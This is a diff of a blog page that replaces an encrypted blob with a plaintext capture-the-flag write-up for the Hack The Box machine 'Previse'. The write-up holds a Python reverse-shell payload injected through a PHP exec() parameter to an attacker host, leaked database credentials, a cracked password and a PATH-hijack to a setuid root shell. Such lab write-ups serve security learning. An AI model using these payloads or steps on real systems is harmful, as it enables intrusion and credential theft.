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</div>
-</div>
+<h2 id="foothold">Foothold<a arialabel="Anchor" class="hanchor" href="#foothold">⌗</a> </h2>
+<p>1- Nmap discovers tcp 22 and 80 ports.</p>
+<pre tabindex="0"><code># Nmap 7.91 scan initiated Thu Aug 12 05:08:52 2021 as: nmap -sV -sC -oA nmap -p- -v previse.htb
+Nmap scan report for previse.htb (10.10.11.104)
+Host is up (0.068s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
+|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
+|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-title: Previse Login
+|_Requested resource was login.php
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu Aug 12 05:17:04 2021 -- 1 IP address (1 host up) scanned in 491.95 seconds
+</code></pre><p>2- <a href="http://previse.htb/login.php">http://previse.htb/login.php</a> is a login page. Intercept POST packet with filled parameters to <code>login.php</code> and save it to <code>request.txt</code>.</p>
+<p>Try with SQLi:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">sqlmap -r request.txt -p password 
+<span style="color:#75715e"># (try with username param too)</span>
+</code></pre></div><p>No SQLi flaws discovered by sqlmap.</p>
+<p>3- Fuzz the request path.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">wfuzz -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc<span style="color:#f92672">=</span><span style="color:#ae81ff">404</span> http://previse.htb
+</code></pre></div><p>Interesting files:</p>
+<pre tabindex="0"><code>index.php -- 302 Found --&gt; RESPONSE1 (see step 4 for details)
+login.php
+config.php
+download.php -- 302 --&gt; login.php
+header.php
+footer.php
+status.php -- 302 --&gt; MySQL server is running!
+nav.php
+accounts.php -- 302 --&gt; Create an admin account
+files.php -- 302  --&gt; backup.zip YEAH!!! Site backups are very welcome!
+</code></pre><p>4- Intercept request packet with BurpSuite and intercept the response. See annotations above.</p>
+<p>RESPONSE1: portal page with links to Home (index.php), create account (accounts.php), files.php, management menu (status.php) and log data (file_log.php).</p>
+<p>5- The only interesting things are backup.zip and the page to create an account. Unzip backup.zip. Look at the config.php.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">connectDB</span>(){
+    $host <span style="color:#f92672">=</span> <span style="color:#e6db74">'localhost'</span>;
+    $user <span style="color:#f92672">=</span> <span style="color:#e6db74">'root'</span>;
+    $passwd <span style="color:#f92672">=</span> <span style="color:#e6db74">'mySQL_p@ssw0rd!:)'</span>;
+    $db <span style="color:#f92672">=</span> <span style="color:#e6db74">'previse'</span>;
+    $mycon <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">mysqli</span>($host, $user, $passwd, $db);
+    <span style="color:#66d9ef">return</span> $mycon;
+}
+
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>MySQL credentials:</p>
+<pre tabindex="0"><code>root
+mySQL_p@ssw0rd!:)
+DBname: previse
+</code></pre><p>But we can only access the database from localhost… Try reusing the credentials with ssh. Impossible though that the SSH root user is the SQL user, so we still need a username. Besides, the password does look like it’s specific to MySQL service.</p>
+<p>6- Revise all files in the site backup folder. Look at logs.php. <code>exec()</code> promises a command injection opportunity.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$_SERVER[<span style="color:#e6db74">'REQUEST_METHOD'</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">'POST'</span>) {
+    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">'Location: login.php'</span>);
+    <span style="color:#66d9ef">exit</span>;
+}
+
+<span style="color:#75715e">/////////////////////////////////////////////////////////////////////////////////////
+</span><span style="color:#75715e">//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
+</span><span style="color:#75715e">/////////////////////////////////////////////////////////////////////////////////////
+</span><span style="color:#75715e"></span>
+$output <span style="color:#f92672">=</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">"/usr/bin/python /opt/scripts/log_process.py </span><span style="color:#e6db74">{</span>$_POST[<span style="color:#e6db74">'delim'</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">"</span>);
+<span style="color:#66d9ef">echo</span> $output;
+
+$filepath <span style="color:#f92672">=</span> <span style="color:#e6db74">"/var/www/out.log"</span>;
+$filename <span style="color:#f92672">=</span> <span style="color:#e6db74">"out.log"</span>;    
+
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">file_exists</span>($filepath)) {
+    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">'Content-Description: File Transfer'</span>);
+    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">'Content-Type: application/octet-stream'</span>);
+    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">'Content-Disposition: attachment; filename="'</span><span style="color:#f92672">.</span><span style="color:#a6e22e">basename</span>($filepath)<span style="color:#f92672">.</span><span style="color:#e6db74">'"'</span>);
+    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">'Expires: 0'</span>);
+    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">'Cache-Control: must-revalidate'</span>);
+    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">'Pragma: public'</span>);
+    <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">'Content-Length: '</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">filesize</span>($filepath));
+    <span style="color:#a6e22e">ob_clean</span>(); <span style="color:#75715e">// Discard data in the output buffer
+</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">flush</span>(); <span style="color:#75715e">// Flush system headers
+</span><span style="color:#75715e"></span>    <span style="color:#a6e22e">readfile</span>($filepath);
+    <span style="color:#66d9ef">die</span>();
+} <span style="color:#66d9ef">else</span> {
+    <span style="color:#a6e22e">http_response_code</span>(<span style="color:#ae81ff">404</span>);
+    <span style="color:#66d9ef">die</span>();
+} 
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>The interesting part is here:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-php" data-lang="php">$output <span style="color:#f92672">=</span> <span style="color:#a6e22e">exec</span>(<span style="color:#e6db74">"/usr/bin/python /opt/scripts/log_process.py </span><span style="color:#e6db74">{</span>$_POST[<span style="color:#e6db74">'delim'</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">"</span>);
+<span style="color:#66d9ef">echo</span> $output;
+</code></pre></div><p>We can trigger a reverse shell.</p>
+<p>Target command:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">python log_process.py comma;python3 -c <span style="color:#e6db74">'import pty,os,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'</span> 
+</code></pre></div><p>Change the POST param in Burpsuite:</p>
+<pre tabindex="0"><code>POST /logs.php HTTP/1.1
+Host: previse.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+Origin: http://previse.htb
+DNT: 1
+Connection: close
+Referer: http://previse.htb/file_logs.php
+Cookie: PHPSESSID=irv4p251afkcliqfqp41f03jbe
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+delim=comma;python3+-c+'import+os,pty,socket;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+</code></pre><p>7- To escalate from a <code>www-data</code> account, I am used to look for config files and database. Use the previously obtained MySQL credentials to access the database using the reverse shell:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">mysql -u root -p
+Enter password: mySQL_p@ssw0rd!:<span style="color:#f92672">)</span>
+
+&gt; use previse;
+&gt; show tables;  <span style="color:#75715e"># accounts and files</span>
+&gt; <span style="color:#66d9ef">select</span> * from accounts;
+<span style="color:#75715e"># columns id, username, password and created_at</span>
+</code></pre></div><p>So, the username is <code>m4lwhere</code> and we have a password hash in md5crypt. Save the hash to hash.txt and crack it with Hashcat.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">hashcat -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">500</span> hash.txt --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt
+</code></pre></div><p>Same but with –show:</p>
+<pre tabindex="0"><code>username = m4lwhere
+hash = $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
+password = ilovecody112235!
+</code></pre><p>Note that john doesn’t support non-printable characters in hash.</p>
+<p>8- SSH and get user.txt: c6a4ac1ae3f1152e13cdfd5f6005673f</p>
+<h2 id="privilege-escalation">Privilege escalation<a arialabel="Anchor" class="hanchor" href="#privilege-escalation">⌗</a> </h2>
+<p>9- <code>sudo -l</code> reveals the script <code>/opt/scripts/access_backup.sh</code>.</p>
+<p>10- Copy to local machine:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">scp m4lwhere@previse.htb:/opt/scripts/access_backup.sh .
+</code></pre></div><p>By looking at this file, we find command path vulnerability.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
+</span><span style="color:#75715e"></span>
+<span style="color:#75715e"># We always make sure to store logs, we take security SERIOUSLY here</span>
+
+<span style="color:#75715e"># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span>
+<span style="color:#75715e"># This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time</span>
+
+gzip -c /var/log/apache2/access.log &gt; /var/backups/<span style="color:#66d9ef">$(</span>date --date<span style="color:#f92672">=</span><span style="color:#e6db74">"yesterday"</span> +%Y%b%d<span style="color:#66d9ef">)</span>_access.gz
+gzip -c /var/www/file_access.log &gt; /var/backups/<span style="color:#66d9ef">$(</span>date --date<span style="color:#f92672">=</span><span style="color:#e6db74">"yesterday"</span> +%Y%b%d<span style="color:#66d9ef">)</span>_file_access.gz
+</code></pre></div><p>11- We can put a script named <code>gzip</code> in the current workdir and execute <code>access_backup.sh</code> as root.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">cd /tmp
+<span style="color:#75715e"># set gzip to be bash with setuid bit</span>
+cat <span style="color:#e6db74">&lt;&lt; EOF &gt; gzip 
+</span><span style="color:#e6db74">#!/bin/bash
+</span><span style="color:#e6db74">cp /bin/bash /tmp/c
+</span><span style="color:#e6db74">chmod u+s /tmp/c
+</span><span style="color:#e6db74">EOF</span>
+</code></pre></div><p>12- Now <code>/tmp/c</code> is a setuid bash.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4" tabindex="0"><code class="language-bash" data-lang="bash">/tmp/c -p <span style="color:#75715e"># this flag sets the real userid as the effective userid</span>
+</code></pre></div><p>root.txt: 23c44ab8465e7ff51a5fab75847e088b</p>
 </div></div>
 </div>
 </div>
@@ -103,5 +254,5 @@
 <script src="/assets/main.js"></script>
 <script src="/assets/prism.js"></script>
 </div>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js"></script><script src="/decrypt.js"></script></body>
+</body>
 </html>
